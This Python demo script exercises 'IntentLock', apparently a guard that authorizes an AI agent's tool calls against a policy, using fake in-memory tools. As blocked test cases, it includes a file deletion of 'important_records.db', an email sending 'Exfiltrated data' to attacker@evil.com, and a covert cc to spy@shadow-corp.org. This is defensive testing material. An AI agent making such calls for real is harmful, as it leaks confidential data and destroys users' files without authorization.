"""IntentLock v0.1 Fake-Tool Interactive Demonstration.

Demonstrates runtime authorization between an agent and its tools:
1. An allowed tool call within policy.
2. A denied tool absent from policy (delete_file).
3. A denied recipient not on the allowlist (attacker@evil.com).
4. A denied undeclared extra argument (cc).

NOTE: All tools below are purely synthetic fakes and do not touch real email,
files, networks, credentials, or external services.
"""

from pathlib import Path
import sys

# Ensure src layout is on python path when running directly
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR / "src"))

from intentlock import Guard, PermissionDenied


# --- Fake Tools (Pure in-memory simulations; no side effects) ---

def fake_read_inbox(max_items: int) -> dict:
    """Simulated inbox reader that returns synthetic messages."""
    synthetic_messages = [
        {"id": 1, "sender": "boss@example.com", "subject": "Project sync"},
        {"id": 2, "sender": "updates@github.com", "subject": "PR #42 merged"},
        {"id": 3, "sender": "support@service.com", "subject": "Invoice #109"},
    ]
    items = synthetic_messages[:max_items]
    return {
        "status": "success",
        "count": len(items),
        "messages": items,
    }


def fake_send_email(to: str, subject: str, body: str) -> dict:
    """Simulated email sender that returns a dispatch receipt."""
    return {
        "status": "sent",
        "recipient": to,
        "subject_length": len(subject),
        "body_length": len(body),
    }


def fake_delete_file(path: str) -> dict:
    """Simulated file deletion tool."""
    return {
        "status": "deleted",
        "path": path,
    }


def run_demo():
    policy_path = ROOT_DIR / "examples" / "policy.json"
    print("=" * 70)
    print(" IntentLock v0.1 Demo: Runtime AI Tool Authorization Checkpoint")
    print("=" * 70)
    print(f"Loading policy from: {policy_path.name}")
    guard = Guard.from_file(policy_path)
    print(f"Active task: {guard.policy.task!r}")
    print(f"Allowed tools: {list(guard.policy.allowed_tools.keys())}")
    print("-" * 70)

    # 1. An allowed tool call
    print("\n[Scenario 1] Executing Authorized Tool: 'read_inbox' (max_items=2)")
    decision = guard.check("read_inbox", {"max_items": 2})
    print(f"  Guard.check(): allowed={decision.allowed}, reason={decision.reason!r}")
    result = guard.call("read_inbox", fake_read_inbox, max_items=2)
    print(f"  Guard.call() executed safely: retrieved {result['count']} simulated messages.")

    # 2. A denied tool (absent from policy)
    print("\n[Scenario 2] Attempting Unauthorized Tool: 'delete_file'")
    decision = guard.check("delete_file", {"path": "important_records.db"})
    print(f"  Guard.check(): allowed={decision.allowed}, reason={decision.reason!r}")
    try:
        guard.call("delete_file", fake_delete_file, path="important_records.db")
        print("  ERROR: Tool call was not blocked!")
    except PermissionDenied as exc:
        print(f"  Guard.call() blocked execution: PermissionDenied - {exc.reason}")

    # 3. A denied recipient (exfiltration attempt)
    print("\n[Scenario 3] Attempting Tool Call with Disallowed Recipient: 'attacker@evil.com'")
    bad_recipient = "attacker@evil.com"
    decision = guard.check(
        "send_email",
        {"to": bad_recipient, "subject": "Confidential", "body": "Exfiltrated data"},
    )
    print(f"  Guard.check(): allowed={decision.allowed}, reason={decision.reason!r}")
    try:
        guard.call(
            "send_email",
            fake_send_email,
            to=bad_recipient,
            subject="Confidential",
            body="Exfiltrated data",
        )
        print("  ERROR: Tool call was not blocked!")
    except PermissionDenied as exc:
        print(f"  Guard.call() blocked execution: PermissionDenied - {exc.reason}")

    # 4. A denied undeclared extra argument (covert cc channel)
    print("\n[Scenario 4] Attempting Undeclared Extra Argument ('cc') on 'send_email'")
    decision = guard.check(
        "send_email",
        {
            "to": "me@example.com",
            "subject": "Summary",
            "body": "Safe content",
            "cc": "spy@shadow-corp.org",
        },
    )
    print(f"  Guard.check(): allowed={decision.allowed}, reason={decision.reason!r}")
    try:
        guard.call(
            "send_email",
            fake_send_email,
            to="me@example.com",
            subject="Summary",
            body="Safe content",
            cc="spy@shadow-corp.org",
        )
        print("  ERROR: Tool call was not blocked!")
    except PermissionDenied as exc:
        print(f"  Guard.call() blocked execution: PermissionDenied - {exc.reason}")

    print("\n" + "=" * 70)
    print(" Demo complete: All unauthorized or invalid tool calls were blocked.")
    print("=" * 70)


if __name__ == "__main__":
    run_demo()
